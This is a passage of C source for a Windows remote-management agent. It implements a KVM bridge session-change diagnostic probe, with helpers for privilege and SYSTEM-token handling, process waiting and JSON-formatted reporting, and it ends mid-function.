static BOOL MeshService_WaitForProcessExitById(DWORD pid, DWORD timeoutMs, DWORD* elapsedMsOut)
{
	ULONGLONG started = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (pid == 0) { return FALSE; }

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		if (!MeshService_IsProcessAliveById(pid))
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_WaitForBridgePidChange(DWORD previousPid, DWORD timeoutMs, DWORD* elapsedMsOut, DWORD* pidOut)
{
	ULONGLONG started = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (pidOut != NULL) { *pidOut = 0; }

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		DWORD pid = (g_slavekvm > 0) ? (DWORD)g_slavekvm : 0;
		if (pid != 0 && pid != previousPid && MeshService_IsProcessAliveById(pid))
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			if (pidOut != NULL) { *pidOut = pid; }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_WaitForBridgePidForReserved(void* reserved, DWORD previousPid, DWORD timeoutMs, DWORD* elapsedMsOut, DWORD* pidOut)
{
	ULONGLONG started = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (pidOut != NULL) { *pidOut = 0; }
	if (reserved == NULL) { return FALSE; }

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		DWORD pid = kvm_bridge_debug_get_child_pid_for_reserved(reserved);
		if (pid != 0 && pid != previousPid && MeshService_IsProcessAliveById(pid))
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			if (pidOut != NULL) { *pidOut = pid; }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_RequestKvmRelayRefreshAndWait(MeshServiceKvmSessionChangeProbeState* state, DWORD timeoutMs, DWORD* elapsedMsOut)
{
	ULONGLONG started = GetTickCount64();
	LONG baselinePackets = 0;

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (state == NULL) { return FALSE; }

	baselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(state);
	kvm_pause(0, state);
	kvm_relay_reset(MeshService_KvmSessionChangeProbeWriteSink, state);

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		if (MeshService_KvmSessionChangeProbeTotalPackets(state) > baselinePackets)
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_WaitForKvmRelayPicture(MeshServiceKvmSessionChangeProbeState* state, DWORD timeoutMs, DWORD* elapsedMsOut)
{
	ULONGLONG started = GetTickCount64();
	LONG baselinePictures = 0;

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (state == NULL) { return FALSE; }

	baselinePictures = state->picturePackets + state->jumboPackets;
	while ((GetTickCount64() - started) <= timeoutMs)
	{
		if ((state->picturePackets + state->jumboPackets) > baselinePictures)
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static int MeshService_RunKvmBridgeSessionChangeProbeWorkerCommand(void)
{
	MeshServiceKvmSessionChangeProbeState state;
	char exePath[MAX_PATH * 4] = { 0 };
	void* chain = NULL;
	void* pipeManager = NULL;
	HANDLE chainThread = NULL;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD initialPid = 0;
	DWORD unlockPid = 0;
	DWORD reconnectPid = 0;
	DWORD initialSpawnMs = 0;
	DWORD initialPacketMs = 0;
	DWORD initialPictureMs = 0;
	DWORD lockStopMs = 0;
	DWORD unlockRespawnMs = 0;
	DWORD unlockPacketMs = 0;
	DWORD unlockPictureMs = 0;
	DWORD disconnectStopMs = 0;
	DWORD reconnectRespawnMs = 0;
	DWORD reconnectPacketMs = 0;
	DWORD reconnectPictureMs = 0;
	DWORD cleanupExitMs = 0;
	DWORD initialBridgeFailureError = 0;
	DWORD initialBridgeFailureStage = 0;
	DWORD initialBridgeFailureSpawnType = 0;
	DWORD initialLaunchAttemptCount = 0;
	DWORD initialSuccessfulSpawnType = 0;
	DWORD initialSuccessfulSpawnAttemptOrdinal = 0;
	DWORD postLockPendingEvent = 0;
	DWORD postLockPendingSessionId = 0;
	DWORD postUnlockPendingEvent = 0;
	DWORD postUnlockPendingSessionId = 0;
	DWORD postUnlockBridgeFailureError = 0;
	DWORD postUnlockBridgeFailureStage = 0;
	DWORD postUnlockBridgeFailureSpawnType = 0;
	DWORD postUnlockLaunchAttemptCount = 0;
	DWORD postUnlockSuccessfulSpawnType = 0;
	DWORD postUnlockSuccessfulSpawnAttemptOrdinal = 0;
	DWORD postUnlockProcessSessionId = 0;
	DWORD reconnectLaunchAttemptCount = 0;
	DWORD reconnectSuccessfulSpawnType = 0;
	DWORD reconnectSuccessfulSpawnAttemptOrdinal = 0;
	BOOL chainCreated = FALSE;
	BOOL chainThreadStarted = FALSE;
	BOOL relayStarted = FALSE;
	BOOL initialSpawned = FALSE;
	BOOL initialPacketsReady = FALSE;
	BOOL initialPicturesReady = FALSE;
	BOOL lockStopped = FALSE;
	BOOL helperAbsentDuringLock = FALSE;
	BOOL unlockRespawned = FALSE;
	BOOL unlockPacketsReady = FALSE;
	BOOL unlockPicturesReady = FALSE;
	BOOL disconnectStopped = FALSE;
	BOOL helperAbsentDuringDisconnect = FALSE;
	BOOL reconnectRespawned = FALSE;
	BOOL reconnectPacketsReady = FALSE;
	BOOL reconnectPicturesReady = FALSE;
	BOOL cleanupExited = FALSE;
	BOOL success = FALSE;
	BOOL initialBridgeAvailable = FALSE;
	BOOL initialBridgeUsed = FALSE;
	BOOL initialFallbackUsed = FALSE;
	BOOL initialTransportActive = FALSE;
	BOOL postLockChildPresent = FALSE;
	BOOL postLockChildExitSignaled = FALSE;
	BOOL postLockRestartSuppressed = FALSE;
	BOOL postLockPendingRestart = FALSE;
	BOOL postLockTransportActive = FALSE;
	BOOL postUnlockChildPresent = FALSE;
	BOOL postUnlockChildExitSignaled = FALSE;
	BOOL postUnlockRestartSuppressed = FALSE;
	BOOL postUnlockPendingRestart = FALSE;
	BOOL postUnlockTransportActive = FALSE;
	BOOL postUnlockBridgeAvailable = FALSE;
	BOOL postUnlockBridgeUsed = FALSE;
	BOOL postUnlockFallbackUsed = FALSE;
	DWORD chainThreadWaitResult = WAIT_FAILED;

	ZeroMemory(&state, sizeof(state));
	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-session-change-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
		fflush(stdout);
		return 1;
	}

	chain = ILibCreateChainEx(0);
	chainCreated = (chain != NULL);
	if (chainCreated)
	{
		pipeManager = ILibProcessPipe_Manager_Create(chain);
	}
	if (pipeManager != NULL)
	{
		chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, chain, 0, NULL);
		chainThreadStarted = (chainThread != NULL);
	}

	if (!chainThreadStarted)
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-session-change-probe\",\"sessionId\":%lu,\"chainCreated\":%s,\"chainThreadStarted\":%s}\n",
			(unsigned long)sessionId,
			chainCreated ? "true" : "false",
			chainThreadStarted ? "true" : "false");
		fflush(stdout);
		if (chain != NULL) { ILibStopChain(chain); }
		if (chainThread != NULL) { CloseHandle(chainThread); }
		return 1;
	}

	Sleep(200);
	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
	relayStarted = (kvm_relay_setup(exePath, pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
	initialBridgeAvailable = (kvm_bridge_debug_get_last_bridge_available() != 0);
	initialBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
	initialFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
	initialTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
	initialBridgeFailureError = kvm_bridge_debug_get_last_bridge_failure_error();
	initialBridgeFailureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
	initialBridgeFailureSpawnType = kvm_bridge_debug_get_last_bridge_failure_spawn_type();
	initialLaunchAttemptCount = kvm_bridge_debug_get_last_launch_attempt_count();
	initialSuccessfulSpawnType = kvm_bridge_debug_get_last_successful_spawn_type();
	initialSuccessfulSpawnAttemptOrdinal = kvm_bridge_debug_get_last_successful_spawn_attempt_ordinal();
	if (relayStarted)
	{
		initialSpawned = MeshService_WaitForBridgePidChange(0, 5000, &initialSpawnMs, &initialPid);
		if (initialSpawned)
		{
			initialPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &initialPacketMs);
			if (initialPacketsReady)
			{
				initialPicturesReady = MeshService_WaitForKvmRelayPicture(&state, 15000, &initialPictureMs);
			}
			initialBridgeAvailable = (kvm_bridge_debug_get_last_bridge_available() != 0);
			initialBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
			initialFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
			initialTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
			initialBridgeFailureError = kvm_bridge_debug_get_last_bridge_failure_error();
			initialBridgeFailureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
			initialBridgeFailureSpawnType = kvm_bridge_debug_get_last_bridge_failure_spawn_type();
			initialLaunchAttemptCount = kvm_bridge_debug_get_last_launch_attempt_count();
			initialSuccessfulSpawnType = kvm_bridge_debug_get_last_successful_spawn_type();
			initialSuccessfulSpawnAttemptOrdinal = kvm_bridge_debug_get_last_successful_spawn_attempt_ordinal();
		}
	}

	if (initialPacketsReady)
	{
		kvm_notify_session_change(WTS_SESSION_LOCK, sessionId);
		lockStopped = MeshService_WaitForProcessExitById(initialPid, 5000, &lockStopMs);
		if (lockStopped)
		{
			Sleep(500);
			postLockChildPresent = (kvm_bridge_debug_get_child_present() != 0);
			postLockChildExitSignaled = (kvm_bridge_debug_is_child_exit_signaled() != 0);
			postLockRestartSuppressed = (kvm_bridge_debug_get_restart_suppressed() != 0);
			postLockPendingRestart = (kvm_bridge_debug_peek_pending_session_restart(&postLockPendingEvent, &postLockPendingSessionId) != 0);
			postLockTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
			helperAbsentDuringLock = !MeshService_IsProcessAliveById(initialPid);
			if (g_slavekvm > 0 && (DWORD)g_slavekvm != initialPid && MeshService_IsProcessAliveById((DWORD)g_slavekvm))
			{
				helperAbsentDuringLock = FALSE;
			}
		}
	}

	if (helperAbsentDuringLock)
	{
		kvm_notify_session_change(WTS_SESSION_UNLOCK, sessionId);
		unlockRespawned = MeshService_WaitForBridgePidChange(initialPid, 5000, &unlockRespawnMs, &unlockPid);
		postUnlockChildPresent = (kvm_bridge_debug_get_child_present() != 0);
		postUnlockChildExitSignaled = (kvm_bridge_debug_is_child_exit_signaled() != 0);
		postUnlockRestartSuppressed = (kvm_bridge_debug_get_restart_suppressed() != 0);
		postUnlockPendingRestart = (kvm_bridge_debug_peek_pending_session_restart(&postUnlockPendingEvent, &postUnlockPendingSessionId) != 0);
		postUnlockTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
		postUnlockProcessSessionId = kvm_bridge_debug_get_process_session_id();
		postUnlockBridgeAvailable = (kvm_bridge_debug_get_last_bridge_available() != 0);
		postUnlockBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
		postUnlockFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
		postUnlockBridgeFailureError = kvm_bridge_debug_get_last_bridge_failure_error();
		postUnlockBridgeFailureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
		postUnlockBridgeFailureSpawnType = kvm_bridge_debug_get_last_bridge_failure_spawn_type();
		postUnlockLaunchAttemptCount = kvm_bridge_debug_get_last_launch_attempt_count();
		postUnlockSuccessfulSpawnType = kvm_bridge_debug_get_last_successful_spawn_type();
		postUnlockSuccessfulSpawnAttemptOrdinal = kvm_bridge_debug_get_last_successful_spawn_attempt_ordinal();
		if (unlockRespawned)
		{
			unlockPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &unlockPacketMs);
			if (unlockPacketsReady)
			{
				unlockPicturesReady = MeshService_WaitForKvmRelayPicture(&state, 15000, &unlockPictureMs);
			}
		}
	}

	if (unlockPacketsReady)
	{
		kvm_notify_session_change(WTS_CONSOLE_DISCONNECT, sessionId);
		disconnectStopped = MeshService_WaitForProcessExitById(unlockPid, 5000, &disconnectStopMs);
		if (disconnectStopped)
		{
			Sleep(500);
			helperAbsentDuringDisconnect = !MeshService_IsProcessAliveById(unlockPid);
			if (g_slavekvm > 0 && (DWORD)g_slavekvm != unlockPid && MeshService_IsProcessAliveById((DWORD)g_slavekvm))
			{
				helperAbsentDuringDisconnect = FALSE;
			}
		}
	}

	if (helperAbsentDuringDisconnect)
	{
		kvm_notify_session_change(WTS_CONSOLE_CONNECT, sessionId);
		reconnectRespawned = MeshService_WaitForBridgePidChange(unlockPid, 5000, &reconnectRespawnMs, &reconnectPid);
		reconnectLaunchAttemptCount = kvm_bridge_debug_get_last_launch_attempt_count();
		reconnectSuccessfulSpawnType = kvm_bridge_debug_get_last_successful_spawn_type();
		reconnectSuccessfulSpawnAttemptOrdinal = kvm_bridge_debug_get_last_successful_spawn_attempt_ordinal();
		if (reconnectRespawned)
		{
			reconnectPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &reconnectPacketMs);
			if (reconnectPacketsReady)
			{
				reconnectPicturesReady = MeshService_WaitForKvmRelayPicture(&state, 15000, &reconnectPictureMs);
			}
		}
	}

	if (relayStarted)
	{
		kvm_cleanup(&state);
		if (reconnectPid != 0)
		{
			cleanupExited = MeshService_WaitForProcessExitById(reconnectPid, 5000, &cleanupExitMs);
		}
		else if (unlockPid != 0)
		{
			cleanupExited = MeshService_WaitForProcessExitById(unlockPid, 5000, &cleanupExitMs);
		}
		else if (initialPid != 0)
		{
			cleanupExited = MeshService_WaitForProcessExitById(initialPid, 5000, &cleanupExitMs);
		}
		Sleep(250);
	}

	success =
		relayStarted &&
		initialSpawned &&
		initialPacketsReady &&
		initialPicturesReady &&
		initialLaunchAttemptCount == 1 &&
		initialSuccessfulSpawnType == (DWORD)ILibProcessPipe_SpawnTypes_WINLOGON &&
		initialSuccessfulSpawnAttemptOrdinal == 1 &&
		lockStopped &&
		lockStopMs <= 2000 &&
		helperAbsentDuringLock &&
		unlockRespawned &&
		unlockRespawnMs <= 2000 &&
		unlockPacketsReady &&
		unlockPicturesReady &&
		postUnlockLaunchAttemptCount == 1 &&
		postUnlockSuccessfulSpawnType == (DWORD)ILibProcessPipe_SpawnTypes_WINLOGON &&
		postUnlockSuccessfulSpawnAttemptOrdinal == 1 &&
		disconnectStopped &&
		disconnectStopMs <= 2000 &&
		helperAbsentDuringDisconnect &&
		reconnectRespawned &&
		reconnectRespawnMs <= 2000 &&
		reconnectLaunchAttemptCount == 1 &&
		reconnectSuccessfulSpawnType == (DWORD)ILibProcessPipe_SpawnTypes_WINLOGON &&
		reconnectSuccessfulSpawnAttemptOrdinal == 1 &&
		reconnectPacketsReady &&
		reconnectPicturesReady &&
		cleanupExited &&
		cleanupExitMs <= 5000;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-bridge-session-change-probe\",");
	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
	printf("\"chainCreated\":%s,", chainCreated ? "true" : "false");
	printf("\"chainThreadStarted\":%s,", chainThreadStarted ? "true" : "false");
	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
	printf("\"initialBridgeAvailable\":%s,", initialBridgeAvailable ? "true" : "false");
	printf("\"initialBridgeUsed\":%s,", initialBridgeUsed ? "true" : "false");
	printf("\"initialFallbackUsed\":%s,", initialFallbackUsed ? "true" : "false");
	printf("\"initialTransportActive\":%s,", initialTransportActive ? "true" : "false");
	printf("\"initialBridgeFailureError\":%lu,", (unsigned long)initialBridgeFailureError);
	printf("\"initialBridgeFailureStage\":%lu,", (unsigned long)initialBridgeFailureStage);
	printf("\"initialBridgeFailureSpawnType\":%lu,", (unsigned long)initialBridgeFailureSpawnType);
	printf("\"initialLaunchAttemptCount\":%lu,", (unsigned long)initialLaunchAttemptCount);
	printf("\"initialSuccessfulSpawnType\":%lu,", (unsigned long)initialSuccessfulSpawnType);
	printf("\"initialSuccessfulSpawnAttemptOrdinal\":%lu,", (unsigned long)initialSuccessfulSpawnAttemptOrdinal);
	printf("\"initialPid\":%lu,", (unsigned long)initialPid);
	printf("\"unlockPid\":%lu,", (unsigned long)unlockPid);
	printf("\"reconnectPid\":%lu,", (unsigned long)reconnectPid);
	printf("\"initialSpawnMs\":%lu,", (unsigned long)initialSpawnMs);
	printf("\"initialPacketMs\":%lu,", (unsigned long)initialPacketMs);
	printf("\"initialPictureMs\":%lu,", (unsigned long)initialPictureMs);
	printf("\"lockStopped\":%s,", lockStopped ? "true" : "false");
	printf("\"lockStopMs\":%lu,", (unsigned long)lockStopMs);
	printf("\"helperAbsentDuringLock\":%s,", helperAbsentDuringLock ? "true" : "false");
	printf("\"postLockChildPresent\":%s,", postLockChildPresent ? "true" : "false");
	printf("\"postLockChildExitSignaled\":%s,", postLockChildExitSignaled ? "true" : "false");
	printf("\"postLockRestartSuppressed\":%s,", postLockRestartSuppressed ? "true" : "false");
	printf("\"postLockPendingRestart\":%s,", postLockPendingRestart ? "true" : "false");
	printf("\"postLockPendingEvent\":%lu,", (unsigned long)postLockPendingEvent);
	printf("\"postLockPendingSessionId\":%lu,", (unsigned long)postLockPendingSessionId);
	printf("\"postLockTransportActive\":%s,", postLockTransportActive ? "true" : "false");
	printf("\"unlockRespawned\":%s,", unlockRespawned ? "true" : "false");
	printf("\"unlockRespawnMs\":%lu,", (unsigned long)unlockRespawnMs);
	printf("\"unlockPacketMs\":%lu,", (unsigned long)unlockPacketMs);
	printf("\"unlockPictureMs\":%lu,", (unsigned long)unlockPictureMs);
	printf("\"postUnlockChildPresent\":%s,", postUnlockChildPresent ? "true" : "false");
	printf("\"postUnlockChildExitSignaled\":%s,", postUnlockChildExitSignaled ? "true" : "false");
	printf("\"postUnlockRestartSuppressed\":%s,", postUnlockRestartSuppressed ? "true" : "false");
	printf("\"postUnlockPendingRestart\":%s,", postUnlockPendingRestart ? "true" : "false");
	printf("\"postUnlockPendingEvent\":%lu,", (unsigned long)postUnlockPendingEvent);
	printf("\"postUnlockPendingSessionId\":%lu,", (unsigned long)postUnlockPendingSessionId);
	printf("\"postUnlockProcessSessionId\":%lu,", (unsigned long)postUnlockProcessSessionId);
	printf("\"postUnlockTransportActive\":%s,", postUnlockTransportActive ? "true" : "false");
	printf("\"postUnlockBridgeAvailable\":%s,", postUnlockBridgeAvailable ? "true" : "false");
	printf("\"postUnlockBridgeUsed\":%s,", postUnlockBridgeUsed ? "true" : "false");
	printf("\"postUnlockFallbackUsed\":%s,", postUnlockFallbackUsed ? "true" : "false");
	printf("\"postUnlockBridgeFailureError\":%lu,", (unsigned long)postUnlockBridgeFailureError);
	printf("\"postUnlockBridgeFailureStage\":%lu,", (unsigned long)postUnlockBridgeFailureStage);
	printf("\"postUnlockBridgeFailureSpawnType\":%lu,", (unsigned long)postUnlockBridgeFailureSpawnType);
	printf("\"postUnlockLaunchAttemptCount\":%lu,", (unsigned long)postUnlockLaunchAttemptCount);
	printf("\"postUnlockSuccessfulSpawnType\":%lu,", (unsigned long)postUnlockSuccessfulSpawnType);
	printf("\"postUnlockSuccessfulSpawnAttemptOrdinal\":%lu,", (unsigned long)postUnlockSuccessfulSpawnAttemptOrdinal);
	printf("\"disconnectStopped\":%s,", disconnectStopped ? "true" : "false");
	printf("\"disconnectStopMs\":%lu,", (unsigned long)disconnectStopMs);
	printf("\"helperAbsentDuringDisconnect\":%s,", helperAbsentDuringDisconnect ? "true" : "false");
	printf("\"reconnectRespawned\":%s,", reconnectRespawned ? "true" : "false");
	printf("\"reconnectRespawnMs\":%lu,", (unsigned long)reconnectRespawnMs);
	printf("\"reconnectLaunchAttemptCount\":%lu,", (unsigned long)reconnectLaunchAttemptCount);
	printf("\"reconnectSuccessfulSpawnType\":%lu,", (unsigned long)reconnectSuccessfulSpawnType);
	printf("\"reconnectSuccessfulSpawnAttemptOrdinal\":%lu,", (unsigned long)reconnectSuccessfulSpawnAttemptOrdinal);
	printf("\"reconnectPacketMs\":%lu,", (unsigned long)reconnectPacketMs);
	printf("\"reconnectPictureMs\":%lu,", (unsigned long)reconnectPictureMs);
	printf("\"cleanupExited\":%s,", cleanupExited ? "true" : "false");
	printf("\"cleanupExitMs\":%lu,", (unsigned long)cleanupExitMs);
	printf("\"lastScreenWidth\":%ld,", state.lastScreenWidth);
	printf("\"lastScreenHeight\":%ld,", state.lastScreenHeight);
	printf("\"screenPackets\":%ld,", state.screenPackets);
	printf("\"displayListPackets\":%ld,", state.displayListPackets);
	printf("\"displayInfoPackets\":%ld,", state.displayInfoPackets);
	printf("\"cursorPackets\":%ld,", state.cursorPackets);
	printf("\"picturePackets\":%ld,", state.picturePackets);
	printf("\"jumboPackets\":%ld}\n", state.jumboPackets);
	fflush(stdout);

	if (chain != NULL) { ILibStopChain(chain); }
	if (chainThread != NULL)
	{
		chainThreadWaitResult = WaitForSingleObject(chainThread, 5000);
		UNREFERENCED_PARAMETER(chainThreadWaitResult);
		CloseHandle(chainThread);
	}
	return success ? 0 : 1;
}

static int MeshService_RunKvmBridgeSessionChangeProbeChildCommand(const WCHAR* reportPath)
{
	FILE* redirectedStdout = NULL;
	errno_t redirectError = 0;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
		if (redirectError != 0 || redirectedStdout == NULL)
		{
			return 1;
		}
	}
	return MeshService_RunKvmBridgeSessionChangeProbeWorkerCommand();
}

static int MeshService_RunKvmBridgeSessionChangeProbeCommand(void)
{
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR reportPath[MAX_PATH] = { 0 };
	WCHAR arguments[512] = { 0 };
	HANDLE systemToken = NULL;
	PROCESS_INFORMATION childProcess;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD systemTokenError = ERROR_SUCCESS;
	DWORD spawnError = ERROR_SUCCESS;
	DWORD childExitCode = STILL_ACTIVE;
	BOOL systemTokenReady = FALSE;
	BOOL childSpawned = FALSE;
	char* childJson = NULL;

	if (MeshService_ProcessHasSystemSid())
	{
		return MeshService_RunKvmBridgeSessionChangeProbeWorkerCommand();
	}

	ZeroMemory(&childProcess, sizeof(childProcess));
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmSessionChangeProbe_%lu.json", tempPath, GetCurrentProcessId());
	DeleteFileW(reportPath);

	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
	if (systemTokenReady)
	{
		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-bridge-session-change-probe-child \"%ls\"", reportPath);
		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
	}

	if (childSpawned)
	{
		WaitForSingleObject(childProcess.hProcess, 60000);
		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
	}

	childJson = MeshService_ReadUtf8TextFileW(reportPath);
	if (childJson != NULL)
	{
		printf("%s\n", childJson);
	}
	else
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-session-change-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
			(unsigned long)sessionId,
			systemTokenReady ? "true" : "false",
			childSpawned ? "true" : "false",
			(unsigned long)systemTokenError,
			(unsigned long)spawnError,
			(unsigned long)childExitCode);
	}
	fflush(stdout);

	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
	if (systemToken != NULL) { CloseHandle(systemToken); }
	if (childJson != NULL) { free(childJson); }
	DeleteFileW(reportPath);

	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
}

extern int g_shutdown;
extern int kvmConsoleMode;

typedef struct MeshServiceSecureDesktopProbeState
{
	LONG screenPackets;
	LONG displayPackets;
	LONG winlogonScreenPackets;
	DWORD timeoutMs;
	ULONGLONG startedTick;
	ULONGLONG firstWinlogonTick;
	char initialDesktop[64];
	char finalDesktop[64];
} MeshServiceSecureDesktopProbeState;

static void MeshService_FilePrintJsonEscapedUtf8(FILE* file, const char* value)
{
	const unsigned char* cursor = (const unsigned char*)((value != NULL) ? value : "");
	while (*cursor != '\0')
	{
		switch (*cursor)
		{
		case '\\': fputs("\\\\", file); break;
		case '"': fputs("\\\"", file); break;
		case '\n': fputs("\\n", file); break;
		case '\r': fputs("\\r", file); break;
		case '\t': fputs("\\t", file); break;
		default: fputc(*cursor, file); break;
		}
		++cursor;
	}
}

static void MeshService_FilePrintJsonEscapedWide(FILE* file, const wchar_t* value)
{
	int needed = 0;
	char* utf8 = NULL;

	if (file == NULL || value == NULL || value[0] == L'\0') { return; }
	needed = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
	if (needed <= 0) { return; }

	utf8 = (char*)malloc((size_t)needed);
	if (utf8 == NULL) { return; }
	if (WideCharToMultiByte(CP_UTF8, 0, value, -1, utf8, needed, NULL, NULL) > 0)
	{
		MeshService_FilePrintJsonEscapedUtf8(file, utf8);
	}
	free(utf8);
}

static BOOL MeshService_WriteUtf8TextFileW(const WCHAR* path, const char* content)
{
	FILE* file = NULL;
	errno_t err = 0;

	if (path == NULL || path[0] == L'\0' || content == NULL) { return FALSE; }
	err = _wfopen_s(&file, path, L"wb");
	if (err != 0 || file == NULL) { return FALSE; }
	fputs(content, file);
	fclose(file);
	return TRUE;
}

static char* MeshService_ReadUtf8TextFileW(const WCHAR* path)
{
	HANDLE file = INVALID_HANDLE_VALUE;
	LARGE_INTEGER size;
	DWORD read = 0;
	char* buffer = NULL;

	if (path == NULL || path[0] == L'\0') { return NULL; }
	file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) { return NULL; }
	if (!GetFileSizeEx(file, &size) || size.QuadPart < 0 || size.QuadPart > 1024 * 1024)
	{
		CloseHandle(file);
		return NULL;
	}

	buffer = (char*)malloc((size_t)size.QuadPart + 1);
	if (buffer == NULL)
	{
		CloseHandle(file);
		return NULL;
	}
	if (size.QuadPart > 0 && !ReadFile(file, buffer, (DWORD)size.QuadPart, &read, NULL))
	{
		free(buffer);
		CloseHandle(file);
		return NULL;
	}
	buffer[read] = '\0';
	CloseHandle(file);
	return buffer;
}

static BOOL MeshService_EnableNamedPrivilegeW(const WCHAR* privilegeName)
{
	HANDLE token = NULL;
	TOKEN_PRIVILEGES privileges;
	LUID luid;
	BOOL ok = FALSE;

	if (privilegeName == NULL || privilegeName[0] == L'\0') { return FALSE; }
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) { return FALSE; }
	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
	{
		CloseHandle(token);
		return FALSE;
	}

	ZeroMemory(&privileges, sizeof(privileges));
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Luid = luid;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL) && GetLastError() == ERROR_SUCCESS)
	{
		ok = TRUE;
	}
	CloseHandle(token);
	return ok;
}

static BOOL MeshService_SetTokenIntegrityLevelToMedium(HANDLE token)
{
	PSID mediumSid = NULL;
	TOKEN_MANDATORY_LABEL mandatoryLabel;
	DWORD labelSize = 0;
	BOOL ok = FALSE;

	if (token == NULL) { return FALSE; }
	if (!ConvertStringSidToSidW(L"S-1-16-8192", &mediumSid)) { return FALSE; }

	ZeroMemory(&mandatoryLabel, sizeof(mandatoryLabel));
	mandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;
	mandatoryLabel.Label.Sid = mediumSid;
	labelSize = sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSid);
	ok = SetTokenInformation(token, TokenIntegrityLevel, &mandatoryLabel, labelSize);

	LocalFree(mediumSid);
	return ok;
}

static DWORD MeshService_GetCurrentSessionId(void)
{
	DWORD sessionId = WTSGetActiveConsoleSessionId();
	DWORD currentSessionId = 0;

	if (ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId))
	{
		if (!(MeshService_ProcessHasSystemSid() && currentSessionId == 0 && sessionId != 0xFFFFFFFF))
		{
			sessionId = currentSessionId;
		}
	}
	return sessionId;
}

static BOOL MeshService_FindProcessIdByNameAndSessionW(const WCHAR* processName, DWORD sessionId, DWORD* pidOut)
{
